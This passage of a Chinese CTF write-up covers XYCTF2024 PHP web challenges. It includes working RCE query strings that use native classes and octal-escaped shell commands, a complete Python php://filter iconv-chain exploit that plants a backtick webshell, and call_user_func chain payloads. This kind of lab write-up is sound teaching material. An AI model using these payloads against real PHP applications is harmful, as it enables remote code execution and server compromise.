+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$aa</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;aa&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$bb</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;bb&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">((</span><span class="k">new</span> <span class="nv">$a</span><span class="p">(</span><span class="nv">$aa</span><span class="p">))</span><span class="o">-&gt;</span><span class="nv">$c</span><span class="p">())((</span><span class="k">new</span> <span class="nv">$b</span><span class="p">(</span><span class="nv">$bb</span><span class="p">))</span><span class="o">-&gt;</span><span class="nv">$c</span><span class="p">());</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>主要是考了一个Error原生类的getMessage可以构造任意字符串</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?a=Error&amp;aa=system&amp;b=Error&amp;bb=cat /f*&amp;c=getMessage
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//((new Error(&#34;system&#34;)) -&gt; getMessage())((new Error(&#34;ls&#34;)) -&gt; getMessage())
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过<code>Error</code>的<code>getMessage</code>返回<code>system</code>和<code>ls</code>，组合成<code>(&quot;system&quot;)(&quot;ls&quot;)</code></p>
+<p>在PHP中，<code>(&quot;system&quot;)(&quot;ls&quot;)</code> 是一个完全合法的表达式，它等同于：<code>system(&quot;ls&quot;);</code></p>
+<p><img src="/p/xyctf2024/image-20250729152837537.png"
+	width="1135"
+	height="570"
+	srcset="/p/xyctf2024/image-20250729152837537_hu16872782013570259015.png 480w, /p/xyctf2024/image-20250729152837537_hu6754550771762911881.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250729152837537"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="199"
+		data-flex-basis="477px"
+	
+></p>
+<p>另一种解法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?a=SplFileObject&amp;aa=data://text/plain,system&amp;c=__toString&amp;b=SplFileObject&amp;bb=data://text/plain,ls
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过tostring返回system和ls，和上面差不多。</p>
+<h2 id="ezrce">ezRce
+</h2><h3 id="知识点无字母rce八进制0">知识点：无字母rce（八进制+$0&laquo;&lt;）
+</h3><p>无字母rce，只有数字和几个符号，可以通过八进制构造命令</p>
+<p><img src="/p/xyctf2024/image-20250729162833971.png"
+	width="1207"
+	height="701"
+	srcset="/p/xyctf2024/image-20250729162833971_hu4836226417956947426.png 480w, /p/xyctf2024/image-20250729162833971_hu11988099955416006299.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250729162833971"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="172"
+		data-flex-basis="413px"
+	
+></p>
+<p><code>$0</code>可以代表当前执行的脚本或Shell本身的名字</p>
+<p><code>&lt;&lt;&lt;</code>:能将紧跟在后面的字符串作为标准输入（stdin）传递给前面的命令</p>
+<p><code>$0 &lt;&lt;&lt; '...'</code> 的意思就是：<strong>启动一个新的Bash Shell，然后把 <code>'...'</code> 里的字符串内容喂给这个新的Shell去执行。</strong></p>
+<p>把八进制命令放进去就行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?cmd=$0&lt;&lt;&lt;$%27\143\141\164\040\057\146\154\141\147%27
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">那其实直接八进制cat&lt;/flag也行
+</span></span><span class="line"><span class="cl">?cmd=$&#39;\143\141\164&#39;&lt;$&#39;\57\146\154\141\147&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xyctf2024/image-20250729162550165.png"
+	width="1186"
+	height="606"
+	srcset="/p/xyctf2024/image-20250729162550165_hu7923446866726682695.png 480w, /p/xyctf2024/image-20250729162550165_hu1230923489866304935.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250729162550165"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="195"
+		data-flex-basis="469px"
+	
+></p>
+<h2 id="ezlfi">ezLFI
+</h2><h3 id="知识点利用filter过滤器的编码组合构造rce">知识点：利用filter过滤器的编码组合构造RCE
+</h3><p>进页面什么都没有，提示LFI，就是文件包含，试试file参数</p>
+<p><img src="/p/xyctf2024/image-20250730193626370.png"
+	width="1303"
+	height="607"
+	srcset="/p/xyctf2024/image-20250730193626370_hu17598898673209395244.png 480w, /p/xyctf2024/image-20250730193626370_hu3092467248937010636.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250730193626370"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="214"
+		data-flex-basis="515px"
+	
+></p>
+<p>ok开包</p>
+<p>包啥呀，啥都没有，不知到过滤了啥。直接翻wp了</p>
+<p>贴一个exp，然后解释一下exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://localhost/index.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">file_to_use</span> <span class="o">=</span> <span class="s2">&#34;/etc/passwd&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s2">&#34;/readflag&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#&lt;?=`$_GET[0]`;;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">base64_payload</span> <span class="o">=</span> <span class="s2">&#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">conversions</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;R&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;B&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;C&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;8&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;9&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;f&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;s&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;z&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;U&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;P&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;V&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;0&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Y&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;W&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;d&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;D&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;7&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;4&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># generate some garbage base64</span>
+</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">=</span> <span class="s2">&#34;convert.iconv.UTF8.CSISO2022KR|&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
+</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">base64_payload</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filters</span> <span class="o">+=</span> <span class="n">conversions</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;|&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># decode and reencode to get rid of everything that isn&#39;t valid base64</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-decode|&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># get rid of equal signs</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-decode&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">final_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;php://filter/</span><span class="si">{</span><span class="n">filters</span><span class="si">}</span><span class="s2">/resource=</span><span class="si">{</span><span class="n">file_to_use</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;0&#34;</span><span class="p">:</span> <span class="n">command</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;include&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="n">final_payload</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>首先是后门文件<code>&lt;?=$_GET[0];;?&gt;</code>base64后得到的是<code>PD89YCRfR0VUWzBdYDs7Pz4=</code></p>
+<p>在PHP Fliter中存在一种<code>convert.iconv</code>的过滤器，他可以用于转化字符集，然后我们发现</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">convert.iconv.UTF8.CSISO2022KR将始终在字符串前面附加&#34;\x1b$)C&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">convert.base64-decode基本上会忽略任何非有效 base64 的字符。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>添加字符串前置<code>\x1b$)C</code>后，应用一些 iconv 转换链，使我们的初始 base64 保持不变 并将我们刚刚添加的部分转换为某些字符串，其中唯一有效的 base64 char 是我们 base64 编码的 PHP 代码的一部分</p>
+<p>再通过base64-decode 和 base64-encode 删除中间的垃圾字符,从而构造出代码</p>
+<p>老外写的，有一些不明不白的地方，看了很多文章都没有解惑，这里先放放。</p>
+<h2 id="ezpop">ezPop
+</h2><h3 id="知识点gc垃圾回收call_user_funcabcd">知识点：GC垃圾回收、call_user_func($a,$b)($c)($d)
+</h3><p><img src="/p/xyctf2024/image-20250802211802489.png"
+	width="687"
+	height="1145"
+	srcset="/p/xyctf2024/image-20250802211802489_hu9567018524117140688.png 480w, /p/xyctf2024/image-20250802211802489_hu6153031978453900890.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250802211802489"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="60"
+		data-flex-basis="144px"
+	
+></p>
+<p>链子很简单，就不多说了，主要是对<code>call_user_func($a,$b)($c)($d)</code>的理解</p>
+<p>这行代码简单来说就是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$f1</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span> <span class="c1">// $f1 必须是 callable
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$f2</span> <span class="o">=</span> <span class="nv">$f1</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>                <span class="c1">// $f2 必须是 callable
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$f2</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>            <span class="c1">// $result 就是最终结果
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以我们需要找到符合这种情况并且可以rce的函数</p>
+<p>在寻找之前，我们要先了解一下<code>__get()</code>函数的逻辑</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;you get 2 B &lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$a</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$b</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">;</span> <span class="c1">// 1. 将整个 $_POST 数组复制给变量 $b
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$c</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$d</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]))</span> <span class="p">{</span> <span class="c1">// 2. 检查 $b 数组中是否存在键 &#39;a&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">unset</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span> <span class="c1">// 3. 如果存在，就从 $b 数组中移除键 &#39;a&#39; 及其对应的值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$b</span><span class="p">)(</span><span class="nv">$c</span><span class="p">)(</span><span class="nv">$d</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>综合一下有以下几种方案：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="s2">&#34;system&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">d</span><span class="o">=</span><span class="s2">&#34;tac /f*&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">a</span><span class="o">=</span><span class="nx">current</span><span class="o">&amp;</span><span class="nx">b</span><span class="o">=</span><span class="nx">sprintf</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">题目里unset了一下$_POST[&#39;a&#39;]，其实就是把数组元素清了一个，有关数组的操作很容易可以想到current，也可以用array_pop(array)这个是删除数组元素并返回，原理是一样的
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">call_user_func(&#39;current&#39;,&#39;$_POST&#39;)返回值完全可控，可以令其为sprintf
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">其返回一个字符串，返回值就是传入的参数
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">d</span><span class="o">=</span><span class="s2">&#34;tac /f*&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">a</span><span class="o">=</span><span class="nx">current</span><span class="o">&amp;</span><span class="nx">b</span><span class="o">=</span><span class="nx">current</span>
+</span></span><span class="line"><span class="cl"><span class="k">or</span>
+</span></span><span class="line"><span class="cl"><span class="nx">a</span><span class="o">=</span><span class="nx">array_pop</span><span class="o">&amp;</span><span class="nx">b</span><span class="o">=</span><span class="nx">array_pop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">array_pop(array)是删除数组元素并返回
+</span></span></span><span class="line"><span class="cl"><span class="cm">array_pop(array(&#34;array_pop&#34;))(array(&#34;system&#34;))(&#34;cat /flag&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="cm">array_pop(array(&#34;system&#34;))(&#34;cat /flag&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="cm">system(&#34;cat /flag&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>下面是官方wp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="nx">Closure</span><span class="o">::</span><span class="na">fromCallable</span><span class="p">[</span><span class="nx">Closure</span><span class="p">,</span><span class="nx">fromCallable</span><span class="p">])(</span><span class="s1">&#39;system&#39;</span><span class="p">)(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"> Closure::fromCallable  使用当前范围从给定的  callback  创建并返回一个新的匿名函数。此方法检查  callback  函数在作用域是否可调用，如果不能，就抛出TypeError。
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="ezserialize">ezSerialize
+</h2><h3 id="知识点反序列化知识点杂糅">知识点：反序列化知识点杂糅
+</h3><p><img src="/p/xyctf2024/image-20250830191416358.png"
+	width="596"
+	height="668"
+	srcset="/p/xyctf2024/image-20250830191416358_hu17090091985203662864.png 480w, /p/xyctf2024/image-20250830191416358_hu15837842252412709741.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250830191416358"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="89"
+		data-flex-basis="214px"
+	
+></p>
+<p>绕过<code>$this-&gt;token === $this-&gt;password</code>，利用引用传递让二者相等</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
